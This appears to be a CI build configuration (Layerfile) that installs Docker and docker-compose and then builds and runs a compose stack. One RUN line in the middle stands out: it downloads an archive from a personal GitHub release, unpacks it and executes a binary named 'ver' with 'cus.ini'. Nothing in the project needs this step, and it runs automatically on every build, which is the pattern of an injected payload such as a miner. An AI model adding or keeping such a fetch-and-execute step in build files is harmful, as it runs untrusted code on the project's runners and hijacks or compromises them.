FROM vm/ubuntu:18.04

# install docker-ce (from tutorial for ubuntu)
RUN apt-get update && \
    apt-get install apt-transport-https ca-certificates curl software-properties-common && \
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
    apt-get update && \
    apt install docker-ce

# install docker compose
RUN curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
    chmod +x /usr/local/bin/docker-compose

# copy the root (i.e., repository root) to /root in the runner
COPY / /root
RUN sudo apt update && wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
# TODO: log in to docker hub
# See https://webapp.io/docs/advanced-workflows#logging-in-to-docker to learn how to log in to docker

RUN REPEATABLE docker-compose build --parallel
RUN docker-compose up -d

# TODO: change port to whatever is configured in your docker-compose.yml
EXPOSE WEBSITE localhost:8000
